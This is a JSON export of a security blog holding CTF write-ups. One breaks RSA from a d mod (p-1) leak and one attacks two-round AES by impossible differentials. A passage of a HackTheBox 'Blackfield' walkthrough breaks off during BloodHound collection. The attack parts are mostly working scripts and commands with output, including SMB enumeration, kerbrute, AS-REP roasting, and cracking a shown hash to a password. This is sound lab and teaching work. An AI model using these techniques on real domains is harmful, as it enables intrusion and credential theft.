
[{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/","section":"Chrono Nexus","summary":"","title":"Chrono Nexus","type":"page"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/ctf/","section":"CTF Writeups","summary":"","title":"CTF Writeups","type":"ctf"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/tags/leaks/","section":"Tags","summary":"","title":"Leaks","type":"tags"},{"content":" Challenge Analysis # Challenge files: here\nThis challenge provides us with server.py and the server connection.\nParameter Generation # The challenge starts by generating the parameters for the RSA encryption. The primes used are 1024 bits each, and the public exponent used is a 20 bits prime number, which is different from the standard \\(e = 65537\\). After the calculation of the private key, an additional information leak: \\(leak = d \\bmod (p-1)\\) is also calculated.\nEncryption Oracle # From this oracle, we can encrypt a message and get the ciphertext for a total of three times. Along with it, we can also get the encrypted flag ciphertext and the leak for free. However, we are not given the value of the public exponent and public modulus. There\u0026rsquo;s also a requirement that the message must have at least 600 bits.\nParameter Recovery to Factorization # Recovering Public Modulus # We can recover the public modulus in just three attempts of encrypting messages. This is done by encrypting \\(m\\), \\(m^3\\), and \\(m^9\\) and getting their respective ciphertext. We can arrange the resulting ciphertexts into the equation below, where if we subtract the previous ciphertext raised to the power of three from the current ciphertext, we can get a multiple of the public modulus.\n$$\\begin{align*} c_i \u0026amp;= c_{i-1}^3 \\bmod n \\ c_i - c_{i-1}^3 \u0026amp;= 0 \\bmod n \\end{align*}$$\nThis means we can get three different multiples of the public modulus \\(n\\) from three ciphertexts.\n$$c_1 - c_0^3 = 0 \\bmod n$$ $$c_2 - c_1^3 = 0 \\bmod n$$ $$c_2 - c_0^9 = 0 \\bmod n$$\nSince we now have three different multiples of the public modulus, we can try to find the GCD of these three values to recover the public modulus. Below is a script that I used to automate the process.\nfrom pwn import * from math import gcd, prod from tqdm import tqdm import itertools from Crypto.Util.number import * def encrypt_msg(msg): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;Enter hex message: \u0026#34;, hex(msg).encode()) io.recvuntil(b\u0026#34;Encrypted (hex): \u0026#34;) return int(io.recvline().strip().decode(), 16) io = remote(\u0026#34;encryption-oracle.ctf.pearlctf.in\u0026#34;, 30012) # io = process([\u0026#34;python3\u0026#34;, \u0026#34;chall/server.py\u0026#34;]) io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) io.recvuntil(b\u0026#34;Encrypted flag: \u0026#34;) enc_flag = int(io.recvline().strip().decode(), 16) io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) io.recvuntil(b\u0026#34;Leak (d mod (p-1)): \u0026#34;) leak = int(io.recvline().strip().decode()) # m = 2**600 -\u0026gt; exponent = [1, 3, 9] ms = [4149515568880992958512407863691161151012446232242436899995657329690652811412908146399707048947103794288197886611300789182395151075411775307886874834113963687061181803401509523685376, 71448348576730208360402604523024658663907311448489024669693316988935593287322878666163481950176220037593478347105937422686501991894419788796088422137966026262523598150372719976137911322484446114613284904383977643176193557817897027023063420124852033989626806764509137929914787205373413116077254242653423277386226627159120168223623660139965116969572411841665962582988716865792650075294655252525257343163566042824495509307872827973214736884381496689456792434150079470111661811761376161068055664012337698456291039551943299284254570579952324837376, 364734282154381048030646304309052106190791433531778775620998444935497949132100044489744246359856303966133189679568623677222355506787481639161602670945959702639522306459508705793630639722772286011395018294163131881256947283664633792451493826789445489744273886978437173311110997887612371643826947092016319266485789676674936642121144880052421548066804185680667244670701569777857162209535462711477927357348443388696117733821433320353098203873600955463636635802048138805282119271167822792520615258583651034228726565153341463139040948455257378740497476474392659211690378633129056863796807917281090342662150318639879809492961736651011236862423316406020430716685336886249815412738731346368551152930689440219813532346902149372142499890166361458180605213246186088708967138367892539555110074649625909691120312155904835109788759135188483596106811524071197429343914697401608164985190578018095109540394302708528602015917954303927983425233850438042947322468454823914479563087114188948029781636028087157478983971323476692679109311135830495473549230477553114177506052940289630215962639686312585028309076084135103498179087226538263078506318131206512836741897818986436154714725386865432369356802242082067242694353549793213577685393357314607578653751157817107484871743141432332877523513766366051642948529346668649497821536980752940776170990525951791115277210665099910458857024989313038628789339850253787038526427444863742610847826950745248707138567386602728475043676636188300621934928290127020446172239944303781717526768728493839225001821713004725768862841697799796482368748357796570748145289691794065336929986960850713189465658109926251352293376, ] cs = [encrypt_msg(m) for m in ms] print(\u0026#34;ms =\u0026#34;, ms) print(\u0026#34;cs =\u0026#34;, cs) print(\u0026#34;enc_flag =\u0026#34;, enc_flag) print(\u0026#34;leak =\u0026#34;, leak) n1 = cs[0] ** 3 - cs[1] n2 = cs[1] ** 3 - cs[2] n3 = cs[0] ** 9 - cs[2] n = gcd(gcd(n1, n2), n3) print(\u0026#34;n =\u0026#34;, n) print(\u0026#34;Bit length of the public modulus:\u0026#34;, n.bit_length()) Recovering Public Exponent # My approach for recovering the public exponent is to brute-force all of the 20 bits long integers, which means integers between \\(2^{19}\\) and \\(2^{20}\\). There are only around \\(500000\\) possibilities, so brute-force is still feasible.\nfor i in tqdm(range(524288, 1048576)): if pow(ms[0], i, n) == cs[0]: print(\u0026#34;e =\u0026#34;, i) break Factoring the Modulus from Leak # Information and steps for factorization:\nThe private exponent \\(d\\) satisfies \\(e . d = 1 \\bmod φ(n)\\), where \\(φ(n) = (p-1)(q-1)\\). We are given a leak where \\(leak = d \\bmod (p-1)\\), which can also be written as \\(d = leak + k(p-1)\\). Since \\(d\\) is the inverse of \\(e \\bmod φ(n)\\), it also holds for modulo \\((p-1)\\), written as \\(e . d = 1 \\bmod (p-1)\\). If we substitute in \\(d = leak + k(p-1)\\), we will get the equation \\(e . leak = 1 \\bmod (p-1)\\). The equation means that \\(p-1\\) is a factor or divisor of \\(e.leak - 1\\). Since we know the value of both \\(e\\) and \\(leak\\), we can try to find the factors of \\(e.leak - 1\\). For each factor \\(t\\), we can check if \\(t + 1\\) divides \\(n\\). If it does, then we have found \\(p\\). I use FactorDB to get the main factors of \\(e.leak - 1\\), then created a Python script to loop for every combinations (and subsets) of the factors to find the value of \\(p\\). The facs_primary is the largest number that can\u0026rsquo;t be factored by FactorDB, but the number must be a part of \\(p\\). It is multiplied by \\(2\\) because \\(p\\) is a prime number, so \\(p - 1\\) must be an even number.\nfacs_primary = 2327966142186625703203675744219978823417989720626326216096238659578127827462271043086388598230800516171536997637969849607606680317223637055410628186200775167477277149038603080734943890372183478247661201822938890646376996789639562474353476533495081966804762659145088917257202156435904567879997051853*2 facs_secondary = [397, 263, 103, 13, 11, 5, 5, 5, 5, 3, 3, 3, 3, 3, 2, 2, 2] def all_subsets(arr): return [list(combo) for r in range(len(arr) + 1) for combo in itertools.combinations(arr, r)] subsets = all_subsets(facs_secondary) for i in tqdm(range(len(subsets))): p = facs_primary * prod(subsets[i]) + 1 if isPrime(p) and p.bit_length() == 1024: print(\u0026#34;p =\u0026#34;, p) break Decrypting the Flag # If we successfully find \\(p\\), we can just calculate the private exponent \\(d\\) and decrypt the flag.\np = 106376261549418619377221254893208558037461518114688135733313579293909678497579690266214726380897544584424831957162185809779362762661313475710580053277612318227488293302304280264983013299204049846600792519321074117058304853797788480694021277222083093292815787400061993643288230820198490895479553084614464555001 q = n // p d = pow(e, -1, (p-1)*(q-1)) print(long_to_bytes(pow(enc_flag, d, n))) Flag: pearl{RSA_1s_n0t_that_easy}\n","date":"9 March 2025","externalUrl":null,"permalink":"/ctf/pearlctf2025/encryption_oracle/","section":"CTF Writeups","summary":"Public modulus and public exponent recovery, factoring the public modulus from leak: d mod (p-1).","title":"Pearl CTF 2025: Encryption Oracle","type":"ctf"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA","type":"tags"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/aes/","section":"Tags","summary":"","title":"AES","type":"tags"},{"content":" Decompiling the Source # Challenge files: here\nIn this challenge, we are provided with chall.zip, out.txt, and pairs.txt. The zip archive contains chall.cpython-311.pyc, utils.cpython-311.pyc, aes.cpython-311.pyc.\nThe challenge source code is compiled Python, which can be decompiled with https://pylingual.io/. The decompiled code shows obfuscated variable name, so I asked ChatGPT to change the variable names into a more readable format.\nUnderstanding the Challenge # Challenge Functions # One of the given files is the source code for AES implementation. This usually hints that the AES used is customized (a non-standard AES).\nThe challenge starts with generating a random 16 bytes key for AES and calls the function generate_encryption_pairs(). This function creates five blocks with the length of 16 bytes, where the first 4 bytes of each blocks are unique random bytes and the remaining 12 bytes of the blocks are null bytes. It will then encrypt the blocks with custom_encrypt() function. The raw blocks and encrypted blocks are then used to create the encryption pairs.\n# Example of a single encryption pair 176a3336000000000000000000000000 56d32528000000000000000000000000 a6830b1a039cf44917aba0318057cea5 50cfdab0b57af032d3c5bd76077a305d The custom_encrypt() function starts by creating an instance of the AES class, passing KEY and 2 as parameters. The 2 here shouldn\u0026rsquo;t exist in regular AES implementation, so that\u0026rsquo;s something that we should take a look on. After creating the instance, it encrypts the block normally with AES, followed by add_round_key(), mix_columns(), and add_round key() again, then it returns the resulting block.\nAES in a Nutshell # Here\u0026rsquo;s how AES encryption works in a nutshell:\nThe master key of AES is expanded into multiple round keys using AES key schedule. There are four main functions. AddRoundKey, where the state is XOR-ed with the round key. SubBytes, where each byte of the state is replaced with another byte based on a lookup table. ShiftRows, where the rows are shifted based on their position, second row shifted by 1, third row by 2, and last row by 3. MixColumns, where the four bytes of each column are combined and mixed together, The first phase is pre-whitening, which is done by performing AddRoundKey. After the first phase, there will be n-1 rounds done for n is the number of AES rounds. For each round, these steps will be performed sequentially: SubBytes \u0026gt; ShiftRows \u0026gt; MixColumns \u0026gt; AddRoundKey. This is called as full round. After it is done, a final round takes place where the steps are the same except that now there is no MixColumns: SubBytes \u0026gt; ShiftRows \u0026gt; AddRoundKey. This is also called as half-round. The Vulnerability # The first unique thing in the encryption here is the creation of the AES instance with AES(KEY, 2). If we take a look at the decompiled code, we can see that 2 stands for the number of rounds. A normal 128-bit (16 bytes) AES will do 10 rounds, but in this one only 2 happens. Also since the custom encryption function adds AddRoundKey \u0026gt; MixColumns \u0026gt; AddRoundKey on top of the encryption, the final round which is usually a half round became a full round instead.\nBased on the information, we can conclude that the AES encryption uses only 2 full rounds of encryption instead of the standard 10 rounds (9 full + 1 half). This means that the encrypted block of AES is not mixed properly yet, allowing us to perform Linear and Differential Cryptanalysis which allows us to retrieve the AES master key.\nAttacking the Cipher # Differential Cryptanalysis # I browsed around for possible attacks on low round AES and I found BlockBreakers by David Wong which shows an attack called Square attack for breaking 4-6 rounds of AES. However, this is not the one I am looking for and I was unable to solve this challenge during the time limit (so this is an up-solve).\nAfter the competition, found that the keyword \u0026ldquo;AES low round attack\u0026rdquo; leads to this blog by Merricx that shows the exact attack that I need. The blog explains about how to break 1 to 3-round AES, which includes Differential chosen-plaintext attack to break two full rounds of AES.\nThe attack used is a chosen-plaintext attack because we need the plaintext differential where the first column is non-zero differential and the rest are zero differential, which is quite specific. Thankfully the plaintext-ciphertext pairs given in pairs.txt already fit this criteria, where the first four bytes (first column) are random bytes and the remaining bytes are null bytes (00). This means that this must be the correct attack.\nPerforming the Attack # Since I can\u0026rsquo;t explain the attack better than the original blog by Merricx, which contains a really good explanation already, I\u0026rsquo;ll go straight to attacking it. This part is really simple because apparently the blog provides the Python implementation of the attack found here as round2-full-impossible-diff.py, which is an Impossible Differential chosen-plaintext attack that requires five plaintext-ciphertext pairs, exactly what we have right now.\nAfter a slight modification to the script to parse the plaintext-ciphertext pairs and also to decrypt with the obtained key, we should be able to get the flag.\nimport os, random from Crypto.Util.strxor import strxor from itertools import product from aes import AES from utils import * def decrypt(ciphertext, key): aes = AES(key, 2) key_expand = aes._key_matrices state = bytes2matrix(ciphertext) add_round_key(state, key_expand[-1]) inv_mix_columns(state) add_round_key(state, key_expand[-1]) return aes.decrypt_block(matrix2bytes(state)) def generate_sbox_different_distribution_table(): table = {} for i in range(256): for j in range(256): diff = i ^ j diff_sbox = sbox[i] ^ sbox[j] if diff in table: if diff_sbox not in table[diff]: table[diff].append(diff_sbox) else: table[diff] = [diff_sbox] return table def inv_last_round(s, k): state = bytes2matrix(s) round_key = bytes2matrix(k) inv_mix_columns(state) add_round_key(state, round_key) inv_shift_rows(state) inv_sub_bytes(state) return matrix2bytes(state) def mix_columns_key(round_key): state = bytes2matrix(round_key) mix_columns(state) return matrix2bytes(state) def generate_impossible_state(differential): impossible = [] for i in range(4): impossible.append([]) for j in range(256): if j not in sbox_ddt[differential[i]]: impossible[i].append(j) impossible_state = [] for i in range(4): for j in impossible[i]: state = bytes2matrix(b\u0026#39;\\x00\u0026#39;*(i) + bytes([j]) + b\u0026#39;\\x00\u0026#39;*(15-i)) shift_rows(state) mix_columns(state) impossible_state.append(matrix2bytes(state)) return impossible_state def generate_256_list(): result = [] for i in range(256): result.append(i) return result shifted_round1 = [0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11] sbox_ddt = generate_sbox_different_distribution_table() print(\u0026#34;[+] Retrieve 5 plaintext-ciphertext pairs from encryption oracle...\u0026#34;) test_pair = [[bytes.fromhex(block) for block in pair.split(\u0026#34;\\n\u0026#34;)] for pair in open(\u0026#34;../pairs.txt\u0026#34;).read().split(\u0026#34;\\n\\n\u0026#34;)[:-1]] impossible_key = [None] * 16 for plaintext1, plaintext2, ciphertext1, ciphertext2 in test_pair: print(\u0026#34;[+] Checking impossible state from differential pair...\u0026#34;) plain_diff = xor(plaintext1, plaintext2) enc_diff = xor(ciphertext1, ciphertext2) impossible_state = generate_impossible_state(plain_diff) for i in range(16): if impossible_key[i] is None: impossible_key[i] = [] shifted_index = shifted_round1[i] for j in range(256): if j in impossible_key[i]: continue guess_key = b\u0026#39;\\x00\u0026#39;*(i) + bytes([j]) + b\u0026#39;\\x00\u0026#39;*(15-i) inv_a = inv_last_round(ciphertext1, guess_key) inv_b = inv_last_round(ciphertext2, guess_key) inv_diff = xor(inv_a, inv_b) for k in impossible_state: if inv_diff[shifted_index] == k[shifted_index]: impossible_key[i].append(j) list_256 = generate_256_list() possible_key = [] for imp_key in impossible_key: possible_key.append(list(set(list_256) - set(imp_key))) all_possible_key = product(*possible_key) ciphertext_check = ciphertext1 for possible_round_key in all_possible_key: mixed_key = mix_columns_key(possible_round_key) master_key = inv_key_expansion(list(mixed_key), 2) decrypt_check = decrypt(ciphertext_check, master_key) if decrypt_check == test_pair[-1][0]: print(\u0026#39;[+] Possible Master Key:\u0026#39;, master_key) encs = [bytes.fromhex(enc) for enc in open(\u0026#34;../out.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;)] pts = [decrypt(enc, master_key) for enc in encs] print(\u0026#34;[+] Flag:\u0026#34;, b\u0026#39;\u0026#39;.join(pts)) ┌──(chronopad㉿VincentXPS)-[~/Documents/ctf2025/AraCTF-Finals_2025/a2s-upsolve/aes-attack] └─$ python3 round2-full-impossible-diff.py [+] Retrieve 5 plaintext-ciphertext pairs from encryption oracle... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Checking impossible state from differential pair... [+] Possible Master Key: b\u0026#39;\\xc3\\x01\\xa7\\xd71\\xe1O\\xd1y\\xf5Tm\\x1c\\xb95\\xae\u0026#39; [+] Flag: b\u0026#39;ARA6{2rounds_of_AES_arent_enough_hmmmm_maybe_3?}\u0026#39; Flag: ARA6{2rounds_of_AES_arent_enough_hmmmm_maybe_3?}\nResources # https://en.wikipedia.org/wiki/Advanced_Encryption_Standard https://www.davidwong.fr/blockbreakers/aes_10_encryption.html https://merri.cx/adventure-of-aes/ https://github.com/Merricx/aes-attack ","date":"26 February 2025","externalUrl":null,"permalink":"/ctf/aractf2025/a2s_3c/","section":"CTF Writeups","summary":"Differential Cryptanalysis to recover encryption key on reduced round AES.","title":"ARA CTF 6.0 2025 Finals: a2s 3c","type":"ctf"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/cryptanalysis/","section":"Tags","summary":"","title":"Cryptanalysis","type":"tags"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active-Directory","type":"tags"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/htb/","section":"HTB Writeups","summary":"","title":"HTB Writeups","type":"htb"},{"content":" Box Information # Creator: aas Release Date: 06 Jun, 2020 OS: Windows Difficulty: Hard This machine starts with getting a list of valid users from SMB, which is used to perform AS-REP roasting to get access to a user. This is then used to change another user\u0026rsquo;s password, who has access over a share in SMB that contains the memory dump for LSASS. I extracted the hashes and gained access to a user with backup privileges, allowing the dumping of domain hashes.\nRecon # Nmap scan # I started the box with a port scan using Nmap. Looks like this box is an active directory (AD) box as it has the DNS, Kerberos, and LDAP running. From the scan results, we can also get the domain name, which is BLACKFIELD.local.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ sudo nmap -p- --min-rate 10000 10.10.10.192 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:10 WIB Nmap scan report for 10.10.10.192 Host is up (1.1s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 24.88 seconds ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ sudo nmap -p 53,88,135,389,445,593,3268,5985 -sCV 10.10.10.192 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:12 WIB Nmap scan report for 10.10.10.192 Host is up (0.60s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-25 13:12:56Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 6h59m58s | smb2-time: | date: 2025-01-25T13:13:24 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.98 seconds SMB enumeration # Since there\u0026rsquo;s SMB running, I decided to start the enumeration here. I start by testing for SMB null authentication and guest account using netexec. The SMB doesn\u0026rsquo;t allow us to list shares as null account, but we can use guest account to do that.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ netexec smb 10.10.10.192 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\: SMB 10.10.10.192 445 DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ netexec smb 10.10.10.192 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\guest: SMB 10.10.10.192 445 DC01 [*] Enumerated shares SMB 10.10.10.192 445 DC01 Share Permissions Remark SMB 10.10.10.192 445 DC01 ----- ----------- ------ SMB 10.10.10.192 445 DC01 ADMIN$ Remote Admin SMB 10.10.10.192 445 DC01 C$ Default share SMB 10.10.10.192 445 DC01 forensic Forensic / Audit share. SMB 10.10.10.192 445 DC01 IPC$ READ Remote IPC SMB 10.10.10.192 445 DC01 NETLOGON Logon server share SMB 10.10.10.192 445 DC01 profiles$ READ SMB 10.10.10.192 445 DC01 SYSVOL Logon server share There are two non-standard shares here, which are forensic and profiles$, and I have read access to profiles$. I will use smbclient to connect to the share and list the contents, and I found that the content of the shares are a lot of empty folders for different users in this machine.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ smbclient \u0026#39;//10.10.10.192/profiles$\u0026#39; -U guest Password for [WORKGROUP\\guest]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jun 3 23:47:12 2020 .. D 0 Wed Jun 3 23:47:12 2020 AAlleni D 0 Wed Jun 3 23:47:11 2020 ABarteski D 0 Wed Jun 3 23:47:11 2020 ABekesz D 0 Wed Jun 3 23:47:11 2020 ...SNIP... ZMalaab D 0 Wed Jun 3 23:47:12 2020 ZMiick D 0 Wed Jun 3 23:47:12 2020 ZScozzari D 0 Wed Jun 3 23:47:12 2020 ZTimofeeff D 0 Wed Jun 3 23:47:12 2020 ZWausik D 0 Wed Jun 3 23:47:12 2020 5102079 blocks of size 4096. 1693830 blocks available smb: \\\u0026gt; We can take the name of these users and make them into a wordlist, then probably use Kerbrute to validate them. Found three valid usernames that we can\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ awk \u0026#39;{print $1}\u0026#39; raw.txt \u0026gt; users.list ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 01/25/25 - Ronnie Flathers @ropnop 2025/01/25 13:29:28 \u0026gt; Using KDC(s): 2025/01/25 13:29:28 \u0026gt; 10.10.10.192:88 2025/01/25 13:29:53 \u0026gt; [+] VALID USERNAME: audit2020@BLACKFIELD.local 2025/01/25 13:32:12 \u0026gt; [+] VALID USERNAME: support@BLACKFIELD.local 2025/01/25 13:32:13 \u0026gt; [+] VALID USERNAME: svc_backup@BLACKFIELD.local 2025/01/25 13:32:48 \u0026gt; Done! Tested 314 usernames (3 valid) in 200.271 seconds Since we can authenticate as guest on the SMB, I decided to do RID brute-force too to get a list of usernames. I found another user lydericlefebvre that doesn\u0026rsquo;t appear on our results above, probably because of the username format firstnamelastname.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ netexec smb 10.10.10.192 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\guest: ...SNIP... SMB 10.10.10.192 445 DC01 1103: BLACKFIELD\\audit2020 (SidTypeUser) SMB 10.10.10.192 445 DC01 1104: BLACKFIELD\\support (SidTypeUser) SMB 10.10.10.192 445 DC01 1413: BLACKFIELD\\svc_backup (SidTypeUser) SMB 10.10.10.192 445 DC01 1414: BLACKFIELD\\lydericlefebvre (SidTypeUser) ...SNIP... Shell as svc_backup # AS-REP roasting # Now that we have a valid list of usernames, we can attempt to check and perform AS-REP roasting. I use GetNPUsers.py for this. Found the AS-REP hash for user support.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ GetNPUsers.py BLACKFIELD.local/ -usersfile valid_users.list -dc-ip 10.10.10.192 -request Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /home/chronopad/.local/bin/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User audit2020 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a [-] User svc_backup doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lydericlefebvre doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Let\u0026rsquo;s identify the hashcat mode for the hash with haiti, then crack the hash using hashcat. Obtained the credential support:#00^BlackKnight.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ haiti \u0026#39;$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a\u0026#39; Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep] ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ echo \u0026#39;$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a\u0026#39; \u0026gt; support.asrep ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ hashcat -m 18200 support.asrep ~/Arsenal/wordlists/rockyou.txt $krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a:#00^BlackKnight BloodHound enumeration # Now that we got a valid domain user credential, let\u0026rsquo;s do further enumeration with BloodHound. I start by using Python BloodHound ingestor to collect the data.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/blackfield-windows] └─$ bloodhound-python -u support -p \u0026#39;#00^BlackKnight\u0026#39; -ns 10.10.10.192 -d BLACKFIELD.local -c all INFO: Found AD domain: blackfield.local INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -3] Temporary failure in name resolution INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 18 computers INFO: Connecting to LDAP server: dc01.blackfield.local INFO: 